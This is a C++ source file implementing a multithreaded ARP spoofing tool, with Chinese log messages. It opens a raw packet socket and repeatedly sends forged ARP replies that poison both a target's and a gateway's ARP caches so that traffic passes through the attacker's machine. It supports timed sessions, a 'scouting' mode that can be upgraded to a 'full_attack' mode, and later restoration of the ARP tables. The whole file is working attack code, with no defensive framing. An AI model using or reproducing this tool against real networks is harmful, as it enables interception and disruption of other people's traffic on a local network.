#include "arp_spoofer.h"
#include "utils.h"
#include <iostream>
#include <sys/socket.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <cstring>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <vector>
#include <chrono>

ARPSpoofer::ARPSpoofer(const std::string& interface) 
    : interface_(interface), raw_socket_(-1), total_packets_sent_(0), total_sessions_(0) {
}

ARPSpoofer::~ARPSpoofer() {
    shutdown();
}

bool ARPSpoofer::initialize() {
    std::cout << "[ARP Spoofer] 正在初始化接口 " << interface_ << std::endl;
    
    if (!create_raw_socket()) {
        return false;
    }
    
    std::cout << "[ARP Spoofer] 初始化成功" << std::endl;
    return true;
}

void ARPSpoofer::shutdown() {
    std::cout << "[ARP Spoofer] 正在关闭..." << std::endl;
    
    // 停止所有活跃会话
    std::lock_guard<std::mutex> lock(sessions_mutex_);
    
    for (auto& [ip, session] : active_sessions_) {
        if (session && session->active) {
            std::cout << "[ARP Spoofer] 正在停止 " << ip << " 的会话" << std::endl;
            session->active = false;
            
            // ★【修复】★ 先停止定时器线程
            if (session->timer_active) {
                session->timer_active = false;
                if (session->timer_thread && session->timer_thread->joinable()) {
                    try {
                        session->timer_thread->join();
                        std::cout << "[ARP Spoofer] 定时器线程已加入 " << ip << std::endl;
                    } catch (const std::exception& e) {
                        std::cout << "[ARP Spoofer] 定时器线程加入失败 " << ip << ": " << e.what() << std::endl;
                    }
                }
                session->timer_thread.reset(); // ★ 显式重置
            }
            
            // 然后停止欺骗线程
            if (session->spoof_thread && session->spoof_thread->joinable()) {
                try {
                    session->spoof_thread->join();
                    std::cout << "[ARP Spoofer] 欺骗线程已加入 " << ip << std::endl;
                } catch (const std::exception& e) {
                    std::cout << "[ARP Spoofer] 欺骗线程加入失败 " << ip << ": " << e.what() << std::endl;
                }
            }
        }
    }
    
    // ★【修复】★ 清理会话
    active_sessions_.clear();
    
    // ★【新增】★ 清理恢复标记
    {
        std::lock_guard<std::mutex> restore_lock(restore_mutex_);
        recently_restored_targets_.clear();
        std::cout << "[ARP Spoofer] 清除恢复跟踪集合" << std::endl;
    }
    
    if (raw_socket_ >= 0) {
        close(raw_socket_);
        raw_socket_ = -1;
    }
    
    std::cout << "[ARP Spoofer] 关闭完成" << std::endl;
}

bool ARPSpoofer::start_spoofing(const std::string& target_ip, const std::string& gateway_ip,
                               const std::string& target_mac, const std::string& gateway_mac,
                               uint32_t duration_seconds, const std::string& attack_type) {
    std::lock_guard<std::mutex> lock(sessions_mutex_);
    
    // 检查是否已经在欺骗这个目标，如果是，则可能是升级攻击
    auto existing_it = active_sessions_.find(target_ip);
    if (existing_it != active_sessions_.end()) {
        auto& existing_session = existing_it->second;
        
        // ★【新功能】★ 如果是升级攻击（从scouting升级到full_attack）
        if (existing_session->attack_type == "scouting" && attack_type == "full_attack") {
            std::cout << "[ARP Spoofer] 正在升级 " << target_ip 
                      << " 的攻击类型 从 " << existing_session->attack_type << " 到 " << attack_type 
                      << " 持续 " << duration_seconds << " 秒" << std::endl;
            
            // 停止旧的定时器
            if (existing_session->timer_active) {
                existing_session->timer_active = false;
                if (existing_session->timer_thread && existing_session->timer_thread->joinable()) {
                    existing_session->timer_thread->join();
                }
            }
            
            // 更新会话信息
            existing_session->duration_seconds = duration_seconds;
            existing_session->attack_type = attack_type;
            
            // ★【修改】★ 启动新的定时器，使用weak_ptr
            if (duration_seconds > 0) {
                existing_session->timer_active = true;
                std::weak_ptr<SpoofSession> session_weak_ptr = existing_session;
                existing_session->timer_thread = std::make_shared<std::thread>(
                    &ARPSpoofer::timer_thread_func, this, target_ip, duration_seconds, session_weak_ptr
                );
            }
            
            return true;
        } else {
            std::cout << "[ARP Spoofer] 目标 " << target_ip << " 正在被欺骗中" << std::endl;
            return true;
        }
    }
    
    // ★【修改】★ 创建新的欺骗会话，使用shared_ptr
    auto session = std::make_shared<SpoofSession>();
    session->target_ip = target_ip;
    session->target_mac = target_mac;
    session->gateway_ip = gateway_ip;
    session->gateway_mac = gateway_mac;
    session->active = true;
    session->packets_sent = 0;
    session->start_time = get_timestamp_ms();
    session->duration_seconds = duration_seconds;  // ★【新增】★
    session->attack_type = attack_type;            // ★【新增】★
    session->timer_active = false;
    
    // 启动欺骗线程
    session->spoof_thread = std::make_unique<std::thread>(
        &ARPSpoofer::spoof_thread_func, this, target_ip
    );
    
    // ★【新增】★ 如果有duration，启动定时器线程，使用weak_ptr
    if (duration_seconds > 0) {
        session->timer_active = true;
        std::weak_ptr<SpoofSession> session_weak_ptr = session;
        session->timer_thread = std::make_shared<std::thread>(
            &ARPSpoofer::timer_thread_func, this, target_ip, duration_seconds, session_weak_ptr
        );
    }
    
    active_sessions_[target_ip] = std::move(session);
    total_sessions_++;
    
    std::cout << "[ARP Spoofer] 开始 " << attack_type << " 欺骗 " << target_ip 
              << " -> " << gateway_ip;
    if (duration_seconds > 0) {
        std::cout << " 持续 " << duration_seconds << " 秒";
    }
    std::cout << std::endl;
    
    return true;
}

bool ARPSpoofer::stop_spoofing(const std::string& target_ip) {
    std::lock_guard<std::mutex> lock(sessions_mutex_);
    
    auto it = active_sessions_.find(target_ip);
    if (it == active_sessions_.end()) {
        return false;
    }
    
    // 停止欺骗会话
    auto& session = it->second;
    session->active = false;
    
    std::cout << "[ARP Spoofer] 正在停止 " << target_ip << " 的欺骗" << std::endl;
    
    // ★【修复】★ 先停止定时器线程
    if (session->timer_active) {
        session->timer_active = false;
        if (session->timer_thread && session->timer_thread->joinable()) {
            try {
                session->timer_thread->join();
                std::cout << "[ARP Spoofer] 定时器线程已停止 " << target_ip << std::endl;
            } catch (const std::exception& e) {
                std::cout << "[ARP Spoofer] 定时器线程停止失败 " << target_ip << ": " << e.what() << std::endl;
            }
        }
        session->timer_thread.reset(); // ★ 显式重置
    }
    
    // 然后停止欺骗线程
    if (session->spoof_thread && session->spoof_thread->joinable()) {
        try {
            session->spoof_thread->join();
            std::cout << "[ARP Spoofer] 欺骗线程已停止 " << target_ip << std::endl;
        } catch (const std::exception& e) {
            std::cout << "[ARP Spoofer] 欺骗线程停止失败 " << target_ip << ": " << e.what() << std::endl;
        }
    }
    
    std::cout << "[ARP Spoofer] 停止 " << session->attack_type << " 欺骗 " << target_ip 
              << " (已发送 " << session->packets_sent << " 个数据包)" << std::endl;
    
    active_sessions_.erase(it);
    return true;
}

bool ARPSpoofer::restore_arp(const std::string& target_ip, const std::string& gateway_ip,
                            const std::string& target_mac, const std::string& gateway_mac) {
    // ★【新增去重检查】★ 避免对同一目标重复恢复
    {
        std::lock_guard<std::mutex> lock(restore_mutex_);
        if (recently_restored_targets_.find(target_ip) != recently_restored_targets_.end()) {
            std::cout << "[ARP Spoofer] ⚠️ ARP 恢复 " << target_ip << " 已在进行中，跳过重复操作" << std::endl;
            return true;  // 认为成功，避免重复日志
        }
        
        // 标记为正在恢复
        recently_restored_targets_.insert(target_ip);
    }
    
    std::cout << "[ARP Spoofer] 正在恢复 " << target_ip << " 的ARP" << std::endl;
    
    // 发送正确的ARP回复包恢复目标的ARP表
    bool success = true;
    
    // 恢复目标的网关记录
    for (int i = 0; i < 3; i++) {
        if (!send_arp_packet(gateway_ip, gateway_mac, target_ip, target_mac, ARPOP_REPLY)) {
            success = false;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
    
    // 发送免费ARP包
    for (int i = 0; i < 2; i++) {
        if (!send_arp_packet(gateway_ip, gateway_mac, gateway_ip, "ff:ff:ff:ff:ff:ff", ARPOP_REPLY)) {
            success = false;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
    
    // ★【延迟清理】★ 1秒后移除恢复标记（给其他线程足够时间检测到去重）
    std::thread cleanup_thread([this, target_ip]() {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        std::lock_guard<std::mutex> lock(restore_mutex_);
        recently_restored_targets_.erase(target_ip);
    });
    cleanup_thread.detach();
    
    return success;
}

bool ARPSpoofer::create_raw_socket() {
    raw_socket_ = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (raw_socket_ < 0) {
        std::cerr << "[ARP Spoofer] 创建原始套接字失败: " << strerror(errno) << std::endl;
        return false;
    }
    
    // 绑定到指定网卡
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface_.c_str(), IFNAMSIZ - 1);
    
    if (ioctl(raw_socket_, SIOCGIFINDEX, &ifr) < 0) {
        std::cerr << "[ARP Spoofer] 获取接口索引失败: " << strerror(errno) << std::endl;
        close(raw_socket_);
        raw_socket_ = -1;
        return false;
    }
    
    struct sockaddr_ll addr;
    memset(&addr, 0, sizeof(addr));
    addr.sll_family = AF_PACKET;
    addr.sll_protocol = htons(ETH_P_ARP);
    addr.sll_ifindex = ifr.ifr_ifindex;
    
    if (bind(raw_socket_, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        std::cerr << "[ARP Spoofer] 绑定套接字失败: " << strerror(errno) << std::endl;
        close(raw_socket_);
        raw_socket_ = -1;
        return false;
    }
    
    return true;
}

bool ARPSpoofer::send_arp_packet(const std::string& src_ip, const std::string& src_mac,
                                const std::string& dst_ip, const std::string& dst_mac,
                                uint16_t operation) {
    // 构造ARP包
    uint8_t packet[sizeof(struct ethhdr) + sizeof(struct ether_arp)];
    memset(packet, 0, sizeof(packet));
    
    // 以太网头
    struct ethhdr* eth_header = (struct ethhdr*)packet;
    
    // 解析MAC地址
    uint8_t src_mac_bytes[6], dst_mac_bytes[6];
    if (!parse_mac_address(src_mac, src_mac_bytes) || 
        !parse_mac_address(dst_mac, dst_mac_bytes)) {
        return false;
    }
    
    memcpy(eth_header->h_dest, dst_mac_bytes, 6);
    memcpy(eth_header->h_source, src_mac_bytes, 6);
    eth_header->h_proto = htons(ETH_P_ARP);
    
    // ARP头
    struct ether_arp* arp_header = (struct ether_arp*)(packet + sizeof(struct ethhdr));
    arp_header->arp_hrd = htons(ARPHRD_ETHER);
    arp_header->arp_pro = htons(ETH_P_IP);
    arp_header->arp_hln = 6;
    arp_header->arp_pln = 4;
    arp_header->arp_op = htons(operation);
    
    // 源MAC和IP
    memcpy(arp_header->arp_sha, src_mac_bytes, 6);
    uint32_t src_ip_addr, dst_ip_addr;
    if (!parse_ip_address(src_ip, &src_ip_addr) || 
        !parse_ip_address(dst_ip, &dst_ip_addr)) {
        return false;
    }
    memcpy(arp_header->arp_spa, &src_ip_addr, 4);
    
    // 目标MAC和IP
    memcpy(arp_header->arp_tha, dst_mac_bytes, 6);
    memcpy(arp_header->arp_tpa, &dst_ip_addr, 4);
    
    // 发送包
    ssize_t sent = send(raw_socket_, packet, sizeof(packet), 0);
    if (sent < 0) {
        std::cerr << "[ARP Spoofer] 发送ARP数据包失败: " << strerror(errno) << std::endl;
        return false;
    }
    
    total_packets_sent_++;
    return true;
}

void ARPSpoofer::spoof_thread_func(const std::string& target_ip) {
    std::cout << "[ARP Spoofer] 欺骗线程已为 " << target_ip << " 启动" << std::endl;
    
    SpoofSession* session = nullptr;
    {
        std::lock_guard<std::mutex> lock(sessions_mutex_);
        auto it = active_sessions_.find(target_ip);
        if (it != active_sessions_.end()) {
            session = it->second.get();
        }
    }
    
    if (!session) {
        std::cerr << "[ARP Spoofer] 找不到会话 " << target_ip << std::endl;
        return;
    }
    
    // 获取本机MAC地址
    std::string local_mac = get_interface_mac();
    if (local_mac.empty()) {
        std::cerr << "[ARP Spoofer] 获取接口MAC地址失败" << std::endl;
        return;
    }
    
    while (session->active) {
        // 发送双向欺骗包
        // 1. 告诉目标：网关的MAC是我的MAC
        send_arp_packet(session->gateway_ip, local_mac, 
                       session->target_ip, session->target_mac, ARPOP_REPLY);
        
        // 2. 告诉网关：目标的MAC是我的MAC
        send_arp_packet(session->target_ip, local_mac,
                       session->gateway_ip, session->gateway_mac, ARPOP_REPLY);
        
        session->packets_sent += 2;
        
        // 等待间隔
        std::this_thread::sleep_for(std::chrono::milliseconds(1500));
    }
    
    std::cout << "[ARP Spoofer] 欺骗线程已结束 " << target_ip << std::endl;
}

// ★【修改】★ 定时器线程函数，使用weak_ptr确保线程安全
void ARPSpoofer::timer_thread_func(const std::string& target_ip, uint32_t duration_seconds, 
                                  std::weak_ptr<SpoofSession> session_weak_ptr) {
    std::cout << "[ARP Spoofer] 定时器已启动 " << target_ip << " - " << duration_seconds << " 秒" << std::endl;
    
    // 等待指定的时间，每秒检查一次是否被取消
    for (uint32_t elapsed = 0; elapsed < duration_seconds; elapsed++) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        
        // ★【修改】★ 在访问前，先尝试将弱引用指针提升为强引用指针
        if (auto session_shared_ptr = session_weak_ptr.lock()) {
            // 如果提升成功，说明会话仍然存在
            if (!session_shared_ptr->timer_active) {
                std::cout << "[ARP Spoofer] 定时器在 " << elapsed << "s 被取消 " << target_ip << std::endl;
                return;
            }
        } else {
            // 如果提升失败，说明会话已被主线程销毁，定时器线程应立即安全退出
            std::cout << "[ARP Spoofer] 定时器退出，因会话已被销毁 " << target_ip << std::endl;
            return;
        }
    }
    
    // 定时器到期，自动停止攻击并恢复网络
    std::cout << "[ARP Spoofer] 定时器到期 " << target_ip << " - 正在自动停止攻击" << std::endl;
    
    // ★【修复死锁】★ 获取恢复网络所需的信息，但不直接调用stop_spoofing（避免死锁）
    std::string gateway_ip, target_mac, gateway_mac;
    bool should_restore = false;
    
    if (auto session_shared_ptr = session_weak_ptr.lock()) {
        gateway_ip = session_shared_ptr->gateway_ip;
        target_mac = session_shared_ptr->target_mac;
        gateway_mac = session_shared_ptr->gateway_mac;
        should_restore = true;
        
        // ★【修复】★ 直接标记会话为不活跃，让欺骗线程自然退出
        session_shared_ptr->active = false;
        session_shared_ptr->timer_active = false;
        
        std::cout << "[ARP Spoofer] 会话 " << target_ip << " 被定时器标记为终止" << std::endl;
    } else {
        std::cout << "[ARP Spoofer] 会话在定时器完成前被销毁 " << target_ip << std::endl;
        return;
    }
    
    // ★【新增】★ 延迟一点时间让欺骗线程有时间检测到状态变化并退出
    std::this_thread::sleep_for(std::chrono::milliseconds(100));
    
    // 恢复网络（不需要锁，因为只使用本地变量）
    if (should_restore && !gateway_ip.empty()) {
        restore_arp(target_ip, gateway_ip, target_mac, gateway_mac);
        std::cout << "[ARP Spoofer] ⏰ 自动恢复网络 " << target_ip << " 超时后" << std::endl;
    }
    
    // ★【新增】★ 通知主程序清理该会话（通过一个安全的方式）
    // 这里可以使用事件队列或其他机制，但现在先简化处理
    std::cout << "[ARP Spoofer] 定时器线程已完成 " << target_ip << std::endl;
}

std::string ARPSpoofer::get_interface_mac() {
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface_.c_str(), IFNAMSIZ - 1);
    
    if (ioctl(raw_socket_, SIOCGIFHWADDR, &ifr) < 0) {
        return "";
    }
    
    return mac_to_string((uint8_t*)ifr.ifr_hwaddr.sa_data);
}

bool ARPSpoofer::parse_mac_address(const std::string& mac_str, uint8_t* mac_bytes) {
    return string_to_mac(mac_str, mac_bytes);
}

bool ARPSpoofer::parse_ip_address(const std::string& ip_str, uint32_t* ip_addr) {
    struct in_addr addr;
    if (inet_aton(ip_str.c_str(), &addr) == 1) {
        *ip_addr = addr.s_addr;
        return true;
    }
    return false;
}

size_t ARPSpoofer::get_active_sessions_count() const {
    std::lock_guard<std::mutex> lock(sessions_mutex_);
    return active_sessions_.size();
}

std::vector<std::string> ARPSpoofer::get_active_targets() const {
    std::lock_guard<std::mutex> lock(sessions_mutex_);
    std::vector<std::string> targets;
    for (const auto& [ip, session] : active_sessions_) {
        if (session && session->active) {
            targets.push_back(ip);
        }
    }
    return targets;
}